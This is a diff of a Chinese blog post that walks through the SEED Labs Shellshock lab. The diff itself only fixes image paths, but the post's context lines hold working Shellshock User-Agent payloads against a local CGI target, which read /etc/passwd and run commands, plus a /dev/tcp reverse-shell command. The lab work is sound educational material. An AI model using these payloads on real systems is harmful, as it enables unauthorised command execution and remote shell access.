@@ -331,20 +331,20 @@
 <p>目前国内的镜像不太稳定，所以选择<strong>走代理</strong>。配置代理的步骤如下，可见已经成功拉取到了镜像。</p>
 <p><img src="/2025/11/03/seedlab2/image.png" alt="image.png"></p>
 <p>其中配置信息如下， <code>192.168.195.1</code> 是宿主机的IP地址，7890端口是VPN所在的端口。</p>
-<p><img src="/image%201.png" alt="image.png"></p>
+<p><img src="/2025/11/03/seedlab2/image1.png" alt="image.png"></p>
 <p>将下面的IP地址映射添加到 <code>/etc/hosts</code>。</p>
-<p><img src="/image%202.png" alt="image.png"></p>
+<p><img src="/2025/11/03/seedlab2/image2.png" alt="image.png"></p>
 <p>利用实验给好的 <code>docker-compose.yml</code> 启动docker。可以看发现我们启动了运行apache服务器的容器。</p>
-<p><img src="/image%203.png" alt="image.png"></p>
-<p><img src="/image%204.png" alt="image.png"></p>
+<p><img src="/2025/11/03/seedlab2/image3.png" alt="image.png"></p>
+<p><img src="/2025/11/03/seedlab2/image4.png" alt="image.png"></p>
 <h2 id="Task-1-Experimenting-with-Bash-Function"><a href="#Task-1-Experimenting-with-Bash-Function" class="headerlink" title="Task 1: Experimenting with Bash Function"></a><strong>Task 1: Experimenting with Bash Function</strong></h2><p>设计一个实验。定义一个包含特殊内容的shell变量foo。用一个看上去是函数定义的字符串作为变量foo的值，并且在结尾的大括号后面添加一个额外的命令(echo)（左大括号前后都需要有一个空格）。在补丁版本的bash（&#x2F;bin&#x2F;bash）上尝试，对于当前进程来说，这些圆括号、大括号没有任何特别的含义，它们仅仅是一个变量的内容，就如同内容中的其他字符一样。 这也是用declare命令列出所有函数定义时显示为空的原因。因为<strong>foo只是一个变量，不是函数。</strong></p>
 <p>用export 命令标记该shell变量，这样它会作为环境变量传给子进程。此时运行有漏洞版本的bash，当一个子Bash进程被创建时，子shell将会解析该环境变量，把它转化为子函数定义。在解析的过程中，由于Shellshock漏洞，Bash将执行大括号后面的额外命令。因此，当有漏洞版本的Bash在子进程中运行后，一个“ extra”字符串被打印出来。</p>
-<p><img src="/image%205.png" alt="image.png"></p>
+<p><img src="/2025/11/03/seedlab2/image5.png" alt="image.png"></p>
 <h2 id="Task-2-Passing-Data-to-Bash-via-Environment-Variable"><a href="#Task-2-Passing-Data-to-Bash-via-Environment-Variable" class="headerlink" title="Task 2: Passing Data to Bash via Environment Variable"></a><strong>Task 2: Passing Data to Bash via Environment Variable</strong></h2><p>由于虚拟机的网络代理有一点问题，所以将docker中的服务的域名改为了<a target="_blank" rel="noopener" href="http://www.seed-server2.com/"><code>www.seed-server2.com</code></a></p>
 <ul>
 <li><strong>通过浏览器访问</strong></li>
 </ul>
-<p><img src="/image%206.png" alt="image.png"></p>
+<p><img src="/2025/11/03/seedlab2/image6.png" alt="image.png"></p>
 <p>经过比对发现HTTP 请求的<strong>HOST、USER_AGENT、ACCEPT</strong>等信息均为环境变量</p>
 <ul>
 <li><strong>通过 <code>curl</code> 访问</strong></li>
@@ -356,29 +356,29 @@
 <span class="token function">curl</span> <span class="token parameter variable">-e</span> <span class="token string">"my data"</span> <span class="token parameter variable">-v</span> www.seed-server2.com/cgi-bin/getenv.cgi
 <span class="token function">curl</span> <span class="token parameter variable">-H</span> <span class="token string">"AAAAAA: BBBBBB"</span> <span class="token parameter variable">-v</span> www.seed-server2.com/cgi-bin/getenv.cgi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="/image%207.png" alt="image.png"></p>
+<p><img src="/2025/11/03/seedlab2/image7.png" alt="image.png"></p>
 <p>第二种方法的发现环境变量 <code>HTTP_USER_AGENT</code>发生了改变。</p>
-<p><img src="/image%208.png" alt="image.png"></p>
+<p><img src="/2025/11/03/seedlab2/image8.png" alt="image.png"></p>
 <p>第三种方法的发现环境变量 <code>HTTP_REFERER</code>发生了改变。</p>
-<p><img src="/image%209.png" alt="image.png"></p>
+<p><img src="/2025/11/03/seedlab2/image9.png" alt="image.png"></p>
 <p>第四种方法的发现新增的参数也被写到了环境变量里面。</p>
-<p><img src="/image%2010.png" alt="image.png"></p>
+<p><img src="/2025/11/03/seedlab2/image10.png" alt="image.png"></p>
 <h2 id="Task-3-Launching-the-Shellshock-Attack"><a href="#Task-3-Launching-the-Shellshock-Attack" class="headerlink" title="Task 3: Launching the Shellshock Attack"></a><strong>Task 3: Launching the Shellshock Attack</strong></h2><p>攻击的目标如图。通过上面的实验可以知道，我们的环境变量会根据报文头传入 <code>bash_shellshock</code> ，且该bash存在环境变量的漏洞，所以可以通过这个方式来操控shell。</p>
-<p><img src="/image%2011.png" alt="image.png"></p>
+<p><img src="/2025/11/03/seedlab2/image11.png" alt="image.png"></p>
 <ol>
 <li><strong>任务A</strong></li>
 </ol>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-A</span> <span class="token string">"() &#123; : ;&#125;; echo ; /bin/cat /etc/passwd"</span>  <span class="token punctuation">\</span>
 http://www.seed-server2.com/cgi-bin/vul.cgi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="/image%2012.png" alt="image.png"></p>
+<p><img src="/2025/11/03/seedlab2/image12.png" alt="image.png"></p>
 <ol start="2">
 <li><strong>任务B</strong></li>
 </ol>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-A</span> <span class="token string">"() &#123; : ;&#125;; echo ; /bin/id "</span>  <span class="token punctuation">\</span>
 http://www.seed-server2.com/cgi-bin/vul.cgi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="/image%2013.png" alt="image.png"></p>
+<p><img src="/2025/11/03/seedlab2/image13.png" alt="image.png"></p>
 <ol start="3">
 <li><strong>任务C</strong></li>
 </ol>
@@ -388,7 +388,7 @@ http://www.seed-server2.com/cgi-bin/vul.cgi
 <span class="token function">curl</span> <span class="token parameter variable">-A</span> <span class="token string">"() &#123; : ;&#125;; echo; /bin/ls -l /tmp"</span> <span class="token punctuation">\</span>
 http://www.seed-server2.com/cgi-bin/vul.cgi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="/image%2014.png" alt="image.png"></p>
+<p><img src="/2025/11/03/seedlab2/image14.png" alt="image.png"></p>
 <ol start="4">
 <li><strong>任务D</strong></li>
 </ol>
@@ -398,21 +398,21 @@ http://www.seed-server2.com/cgi-bin/vul.cgi
 <span class="token function">curl</span> <span class="token parameter variable">-A</span> <span class="token string">"() &#123; : ;&#125;; echo; /bin/ls -l /tmp"</span> <span class="token punctuation">\</span>
 http://www.seed-server2.com/cgi-bin/vul.cgi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="/image%2015.png" alt="image.png"></p>
+<p><img src="/2025/11/03/seedlab2/image15.png" alt="image.png"></p>
 <h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a><strong>问题</strong></h2><p><strong>Q1：</strong></p>
 <p>不能打开&#x2F;etc&#x2F;shadow，因为只是www-data权限，权限不够，需要root权限</p>
-<p><img src="/image%2016.png" alt="image.png"></p>
+<p><img src="/2025/11/03/seedlab2/image16.png" alt="image.png"></p>
 <p><strong>Q2：</strong></p>
 <p>不能成功，虽然能够作为环境变量传入，但不能成功将带空格的字符串设置为环境变量，所以不能攻击成功</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-V</span> http://www.seed-server2.com/cgi-bin/vul.cgi?<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token builtin class-name">:</span> <span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> <span class="token punctuation">;</span> /bin/id <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/image%2017.png" alt="image.png"></p>
+<p><img src="/2025/11/03/seedlab2/image17.png" alt="image.png"></p>
 <h2 id="Task-4-Getting-a-Reverse-Shell-via-Shellshock-Attack"><a href="#Task-4-Getting-a-Reverse-Shell-via-Shellshock-Attack" class="headerlink" title="Task 4: Getting a Reverse Shell via Shellshock Attack"></a><strong>Task 4: Getting a Reverse Shell via Shellshock Attack</strong></h2><p>虚拟机（attacker）的IP为 <code>172.17.0.1</code> ，向docker(victim)输入下面的信息，即可以获取shell</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-A</span> <span class="token string">"() &#123; : ;&#125;; echo; /bin/bash -i > /dev/tcp/172.17.0.1/9090 0>&amp;1 2>&amp;1"</span><span class="token punctuation">\</span> 
 http://www.seed-server2.com/cgi-bin/vul.cgi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="/image%2018.png" alt="image.png"></p>
-<p><img src="/image%2019.png" alt="image.png"></p>
+<p><img src="/2025/11/03/seedlab2/image18.png" alt="image.png"></p>
+<p><img src="/2025/11/03/seedlab2/image19.png" alt="image.png"></p>
 <p>已经获取到了victim的bash</p>
 <h2 id="Task-5-Using-the-Patched-Bash"><a href="#Task-5-Using-the-Patched-Bash" class="headerlink" title="Task 5: Using the Patched Bash"></a><strong>Task 5: Using the Patched Bash</strong></h2><p>修改 <code>vul.cgi</code> 并重新构建docker。</p>
 <p><img src="/2025/11/03/seedlab2/16ecdf76-35e6-4db6-8a23-40179f8ef5de.png" alt="image.png"></p>
@@ -431,7 +431,7 @@ http://www.seed-server2.com/cgi-bin/vul.cgi<span aria-hidden="true" class="line-
 <span class="token function">docker-compose</span> up<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>可以发现task3中的攻击均失效了。</p>
-<p><img src="/image%2020.png" alt="image.png"></p>
+<p><img src="/2025/11/03/seedlab2/image20.png" alt="image.png"></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次实验比较简单。由于国内镜像的原因，docker的环境配置比较麻烦，以及之前配置的网络代理导致我在上网访问docker的时候出了一点问题。过程中，加深对环境变量的理解和熟悉了docker构建的操作，实验中最难最关键点在于反弹Shell的指令。</p>
 
   </div>
